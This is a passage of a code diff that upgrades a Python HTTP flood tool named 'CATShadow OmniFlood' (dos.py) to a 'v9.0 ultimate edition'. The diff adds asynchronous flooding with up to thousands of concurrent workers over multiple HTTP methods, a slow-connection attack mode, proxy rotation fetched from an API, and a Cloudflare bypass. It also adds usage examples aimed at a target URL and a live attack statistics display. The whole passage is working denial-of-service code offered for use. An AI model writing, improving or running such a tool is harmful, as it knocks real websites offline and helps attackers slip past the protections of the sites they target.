+            top_codes = sorted(s['status_counts'].items(), key=lambda x: -x[1])[:3]
+            status_str = " | ".join([f"{code}:{count}" for code, count in top_codes])
         
-        await self.pool.close()
-        return self.stats
+        print(f"\r[{elapsed}s | {remaining}s] {bar} | "
+              f"T:{s['total']:,} | RPS:{rps:.0f} | "
+              f"OK:{ok_pct:.1f}% | BL:{bl_pct:.1f}% | ERR:{err_pct:.1f}% | "
+              f"CF:{s['cf_challenge']:,} | {status_str}",
+              end='', flush=True)
     
-    async def _cleanup_loop(self):
-        while self.running:
-            await asyncio.sleep(60)
-            if self.pool:
-                async with self.pool.session_lock:
-                    self.pool.sessions = [s for s in self.pool.sessions if not s.closed]
-                    self.pool.used_sessions = {s for s in self.pool.used_sessions if not s.closed}
-    
-    async def _monitor(self):
-        while self.running:
-            await asyncio.sleep(0.5)
-            elapsed = time.time() - self.start_time
-            total = self.stats['total']
-            rps = total / elapsed if elapsed > 0 else 0
-            
-            status_parts = []
-            for version, codes in self.stats['status_counts'].items():
-                for code, count in codes.items():
-                    status_parts.append(f"{code}={count}")
-            status_str = ", ".join(status_parts[:5]) or "No responses"
-            
-            method_str = ", ".join([f"{m}:{self.stats['method_counts'].get(m, 0)}" for m in self.methods])
-            
-            sys.stdout.write('\033[H\033[J')
-            print(f"{'='*70}")
-            print(f"🐱 CATShadow OmniFlood v6.2 - Multi-Method Attack")
-            print(f"{'='*70}")
-            print(f"Target: {self.target}")
-            print(f"Methods: {', '.join(self.methods)}")
-            print(f"Method Distribution: {method_str}")
-            print(f"Elapsed: {elapsed:.1f}s / {self.duration}s")
-            print(f"Requests: {total} | RPS: {rps:.1f}")
-            print(f"Success: {self.stats['success']} | Failed: {self.stats['failed']}")
-            print(f"Adaptive Delay: {self.current_delay}ms")
-            print(f"Proxies: {'Enabled' if self.use_proxy else 'Disabled'}")
-            if self.proxy_manager.proxies:
-                print(f"Proxy Count: {len(self.proxy_manager.proxies)}")
-            print(f"Status: {status_str}")
-            print(f"{'='*70}")
-            sys.stdout.flush()
+    print("\n")
 
 # ==================== MAIN ====================
-def main():
-    if len(sys.argv) < 4:
+async def main_async():
+    if len(sys.argv) < 2:
         print("""
-🐱 CATShadow OmniFlood v6.2 - Fixed Event Loop
-Usage: python dos.py <target> <duration> <methods> [proxy]
+🐱 CATShadow OmniFlood v9.0 - COMPLETE ULTIMATE EDITION
+All Features: Proxy API + HTTP/2 + HTTP/3 + CF Bypass + Multi-Method + Adaptive Delay
 
-Available Methods:
-  GET, POST, PUT, PATCH, DELETE, HEAD, SLOW, ALL
+Usage: python dos.py <target> [duration] [concurrency] [methods] [proxy] [no-cf]
+
+Arguments:
+  target     - Target URL (e.g., https://target.com)
+  duration   - Attack duration in seconds (default: 7200)
+  concurrency - Number of concurrent workers (default: 5000)
+  methods    - Comma-separated methods: GET,POST,PUT,PATCH,DELETE,HEAD,ALL (default: GET)
+  proxy      - Use proxies (auto-fetch from API)
+  no-cf      - Disable Cloudflare bypass
 
 Examples:
-  python dos.py https://target.com 60 GET,POST
-  python dos.py https://target.com 120 GET,POST,PUT,PATCH proxy
-  python dos.py https://target.com 60 ALL proxy
-  python dos.py https://target.com 60 SLOW
+  python dos.py https://target.com
+  python dos.py https://target.com 7200
+  python dos.py https://target.com 7200 10000
+  python dos.py https://target.com 7200 5000 GET,POST,PUT
+  python dos.py https://target.com 7200 5000 ALL proxy
+  python dos.py https://target.com 7200 5000 GET no-cf
+  python dos.py https://target.com 7200 5000 GET,POST proxy no-cf
         """)
         sys.exit(1)
     
     target = sys.argv[1]
-    duration = int(sys.argv[2])
-    methods_str = sys.argv[3].upper()
+    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 7200
+    concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
     
+    # Parse methods
+    methods = ['GET']
+    if len(sys.argv) > 4:
+        methods_str = sys.argv[4].upper()
+        if methods_str == 'ALL':
+            methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
+        else:
+            methods = [m.strip() for m in methods_str.split(',') if m.strip()]
+    
+    # Parse flags
     use_proxy = False
-    if len(sys.argv) > 4 and sys.argv[4].lower() == 'proxy':
-        use_proxy = True
+    cf_bypass = True
     
-    all_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
+    for arg in sys.argv[5:]:
+        if arg.lower() == 'proxy':
+            use_proxy = True
+        elif arg.lower() == 'no-cf':
+            cf_bypass = False
     
-    if methods_str == 'ALL':
-        methods = all_methods
-    else:
-        methods = [m.strip() for m in methods_str.split(',') if m.strip() in all_methods]
+    if not target.startswith(('http://', 'https://')):
+        target = 'https://' + target
     
-    if not methods:
-        print("[!] No valid methods specified.")
-        sys.exit(1)
-    
-    # SLOW mode
+    # Handle SLOW mode
     if 'SLOW' in methods:
-        print(f"\n🐱 CATShadow OmniFlood v6.2 - SLOW ATTACK")
-        print(f"{'='*50}")
-        print(f"Target: {target}")
-        print(f"Duration: {duration}s")
-        print(f"Mode: SLOW")
-        print(f"{'='*50}\n")
-        
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            engine = SlowAttack(target, duration)
-            stats = loop.run_until_complete(engine.run())
-            print(f"\nSLOW Attack Complete:")
-            print(f"  Connections kept open: {stats['connections']}")
-            print(f"  Total requests: {stats['total']}")
-        except KeyboardInterrupt:
-            print("\n[!] Attack interrupted")
-        finally:
-            loop.close()
+        print(f"\n[*] SLOW ATTACK MODE")
+        engine = SlowAttack(target, duration, cf_bypass)
+        stats = await engine.run()
+        print(f"\nSLOW Attack Complete: {stats['connections']} connections kept open")
         return
     
-    # Normal attack
-    print(f"\n🐱 CATShadow OmniFlood v6.2 - Multi-Method Attack")
-    print(f"{'='*50}")
-    print(f"Target: {target}")
-    print(f"Duration: {duration}s")
-    print(f"Methods: {', '.join(methods)}")
-    print(f"Proxies: {'Enabled (auto-fetch from API)' if use_proxy else 'Disabled'}")
-    print(f"{'='*50}\n")
+    # Normal flood attack
+    stats = Stats()
+    start_time = time.time()
     
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    # Setup proxy
+    proxy_manager = ProxyManager(use_proxy)
+    if use_proxy:
+        print("[*] Fetching proxies from API...")
+        await proxy_manager.refresh_proxies()
+        if proxy_manager.proxies:
+            print(f"\n[+] Using {len(proxy_manager.proxies)} proxies")
     
+    # Setup connection pool
+    pool = ConnectionPool(proxy_manager, cf_bypass)
+    
+    # Create workers
+    workers = []
+    for _ in range(min(concurrency, MAX_WORKERS)):
+        session = await pool.get_session()
+        if session:
+            workers.append(asyncio.create_task(
+                flood_worker(session, stats, target, duration, methods, cf_bypass, True)
+            ))
+        else:
+            break
+    
+    # Monitor task
+    monitor_task = asyncio.create_task(
+        monitor(stats, duration, start_time, len(workers), target, methods, cf_bypass)
+    )
+    
+    # Wait for completion
+    await asyncio.sleep(duration)
+    
+    # Cleanup
+    for worker in workers:
+        worker.cancel()
+    await asyncio.gather(*workers, return_exceptions=True)
+    
+    monitor_task.cancel()
     try:
-        engine = AttackEngine(target, methods, duration, use_proxy)
-        stats = loop.run_until_complete(engine.run())
-        
-        elapsed = time.time() - engine.start_time
-        
-        print(f"\n{'='*50}")
-        print("ATTACK COMPLETE")
-        print(f"{'='*50}")
-        print(f"Duration: {elapsed:.1f}s")
-        print(f"Total Requests: {stats['total']}")
-        print(f"Successful: {stats['success']}")
-        print(f"Failed: {stats['failed']}")
-        if stats['total'] > 0:
-            print(f"Success Rate: {(stats['success']/stats['total']*100):.1f}%")
-            print(f"Average RPS: {stats['total']/elapsed:.1f}")
-        
-        print(f"\nMethod Distribution:")
-        for method, count in stats['method_counts'].items():
-            if stats['total'] > 0:
-                pct = (count / stats['total']) * 100
-                print(f"  {method}: {count} ({pct:.1f}%)")
-            else:
-                print(f"  {method}: {count}")
-        
-        print(f"\nStatus Codes:")
-        for version, codes in stats['status_counts'].items():
-            for code, count in sorted(codes.items()):
-                status_text = STATUS_DESCRIPTIONS.get(code, 'Unknown')
-                print(f"  {code} ({status_text}): {count}")
-        
-        if stats['error_types']:
-            print(f"\nError Types:")
-            for error_type, count in sorted(stats['error_types'].items(), key=lambda x: -x[1]):
-                print(f"  {error_type}: {count}")
-        
-        print(f"{'='*50}")
-        
+        await monitor_task
+    except asyncio.CancelledError:
+        pass
+    
+    await pool.close()
+    
+    # Final stats
+    s = stats.get()
+    elapsed = time.time() - start_time
+    
+    print(f"\n{'='*70}")
+    print("ATTACK COMPLETE")
+    print(f"{'='*70}")
+    print(f"Duration: {elapsed:.1f}s")
+    print(f"Total Requests: {s['total']:,}")
+    print(f"  ✓ Success (2xx): {s['ok']:,} ({(s['ok']/max(s['total'],1)*100):.1f}%)")
+    print(f"  ✗ Blocked (403): {s['bl']:,} ({(s['bl']/max(s['total'],1)*100):.1f}%)")
+    print(f"  ✗ Errors: {s['err']:,} ({(s['err']/max(s['total'],1)*100):.1f}%)")
+    print(f"  🔥 CF Challenges: {s['cf_challenge']:,}")
+    print(f"Average RPS: {s['total']/elapsed:.1f}")
+    print(f"Methods Used: {', '.join(methods)}")
+    print(f"Concurrency: {len(workers)}")
+    print(f"Proxies: {'Enabled' if use_proxy else 'Disabled'}")
+    print(f"CF Bypass: {'Enabled' if cf_bypass else 'Disabled'}")
+    
+    if s['status_counts']:
+        print(f"\nStatus Code Breakdown:")
+        for code, count in sorted(s['status_counts'].items(), key=lambda x: -x[1]):
+            desc = STATUS_DESCRIPTIONS.get(code, 'Unknown')
+            print(f"  {code} ({desc}): {count:,}")
+    
+    print(f"{'='*70}")
+
+def main():
+    try:
+        asyncio.run(main_async())
     except KeyboardInterrupt:
         print("\n[!] Attack interrupted")
     except Exception as e:
         print(f"\n[!] Error: {e}")
     finally:
-        loop.close()
         gc.collect()
 
 if __name__ == "__main__":
-    try:
-        signal.signal(signal.SIGINT, lambda s, f: None)
-        main()
-    except KeyboardInterrupt:
-        print("\n[!] Shutting down...")
-    except Exception as e:
-        print(f"\n[!] Error: {e}")
-    finally:
-        gc.collect()
+    signal.signal(signal.SIGINT, lambda s, f: None)
+    main()
